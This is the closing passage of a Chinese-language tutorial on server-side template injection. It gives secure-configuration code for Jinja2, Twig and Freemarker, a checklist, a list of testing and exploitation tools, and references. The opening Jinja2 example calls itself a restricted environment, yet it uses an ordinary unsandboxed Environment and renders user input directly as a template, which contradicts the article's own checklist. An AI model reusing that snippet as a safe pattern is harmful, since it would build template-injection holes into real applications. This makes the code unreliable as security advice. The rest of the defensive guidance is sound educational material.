from jinja2 import Environment

# 创建受限环境
env = Environment()
# 只暴露安全的对象
safe_globals = {
    'range': range,
    'len': len,
    'str': str,
}
template = env.from_string(user_input, globals=safe_globals)
```

### 4. 模板引擎安全配置

#### Twig安全配置

```php
$loader = new \Twig\Loader\ArrayLoader([
    'index' => 'Hello, {{ name }}!',
]);
$twig = new \Twig\Environment($loader, [
    'autoescape' => 'html',
    'sandboxed' => true,  // 启用沙箱
]);

// 配置沙箱策略
$policy = new \Twig\Sandbox\SecurityPolicy([
    'if', 'for', 'set'
], [], [], []);
$sandbox = new \Twig\Extension\SandboxExtension($policy);
$twig->addExtension($sandbox);
```

#### Freemarker安全配置

```java
Configuration cfg = new Configuration(Configuration.VERSION_2_3_31);

// 禁用危险内置函数
cfg.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);

// 或者完全禁用
cfg.setNewBuiltinClassResolver(TemplateClassResolver.ALLOWS_NOTHING_RESOLVER);
```

### 5. 最小权限原则

#### 应用权限

- 以非root用户运行应用
- 限制文件系统访问权限
- 使用chroot或容器隔离

#### 网络权限

- 限制出站网络连接
- 使用防火墙规则
- 监控异常网络活动

### 6. 安全开发最佳实践

#### 安全编码检查清单

- [ ] 永远不要直接拼接用户输入到模板
- [ ] 对所有用户输入进行验证和过滤
- [ ] 使用模板引擎的自动转义功能
- [ ] 在沙箱环境中执行用户提供的模板
- [ ] 限制模板可访问的对象和方法
- [ ] 定期进行安全审计和代码审查
- [ ] 使用静态代码分析工具
- [ ] 及时更新模板引擎到最新版本

#### 安全测试工具

| 工具 | 用途 | 链接 |
|------|------|------|
| Tplmap | SSTI自动化检测和利用 | https://github.com/epinna/tplmap |
| SSTImap | SSTI检测工具 | https://github.com/vladko312/SSTImap |
| Burp Suite | Web应用安全测试 | https://portswigger.net/burp |
| OWASP ZAP | 开源Web应用扫描器 | https://www.zaproxy.org |

---

## 总结

SSTI是一种危害极大的Web安全漏洞，攻击者可以利用它在服务器端执行任意代码。防御SSTI需要从多个层面入手：

### 防御要点

1. **输入验证**：对所有用户输入进行白名单验证，拒绝或过滤危险字符
2. **安全渲染**：使用模板引擎的安全渲染方式，分离模板和数据
3. **沙箱限制**：在沙箱环境中执行模板，限制可访问的对象和方法
4. **最小权限**：应用以最小权限运行，限制文件系统和网络访问
5. **安全配置**：正确配置模板引擎的安全选项

### 安全开发建议

**对于开发者**：
- 永远不要信任用户输入，始终进行验证和过滤
- 使用模板引擎的自动转义功能
- 避免直接拼接用户输入到模板字符串
- 定期进行安全审计和代码审查
- 及时更新模板引擎和依赖库

**对于安全研究人员**：
- 在进行渗透测试前确保获得合法授权
- 使用隔离的测试环境进行漏洞研究
- 负责任地披露漏洞，帮助厂商修复
- 遵守相关法律法规和道德准则

### 学习资源

- [OWASP SSTI](https://owasp.org/www-community/vulnerabilities/Server-Side_Template_Injection)
- [PortSwigger SSTI](https://portswigger.net/web-security/server-side-template-injection)
- [Tplmap - SSTI exploitation tool](https://github.com/epinna/tplmap)
- [PayloadsAllTheThings - SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [Jinja2官方文档](https://jinja.palletsprojects.com/)
- [Twig官方文档](https://twig.symfony.com/)
- [Freemarker官方文档](https://freemarker.apache.org/)

---

## 参考资源

- [OWASP Server-Side Template Injection](https://owasp.org/www-community/vulnerabilities/Server-Side_Template_Injection)
- [PortSwigger Web Security Academy - SSTI](https://portswigger.net/web-security/server-side-template-injection)
- [Tplmap - SSTI exploitation tool](https://github.com/epinna/tplmap)
- [SSTImap - Automatic SSTI detection tool](https://github.com/vladko312/SSTImap)
- [PayloadsAllTheThings - SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [HackTricks - SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
- [狼组安全团队 - SSTI知识库](https://wiki.wgpsec.org/knowledge/ctf/ssti.html)
- [Jinja2官方文档](https://jinja.palletsprojects.com/)
- [Twig官方文档](https://twig.symfony.com/)
- [Freemarker官方文档](https://freemarker.apache.org/)
- [Velocity官方文档](https://velocity.apache.org/)
- [Thymeleaf官方文档](https://www.thymeleaf.org/)

---

*本文仅供学习交流使用，请勿用于非法用途。进行安全测试时，请确保已获得目标系统的合法授权。*

*本文最后更新于：2026年3月16日*
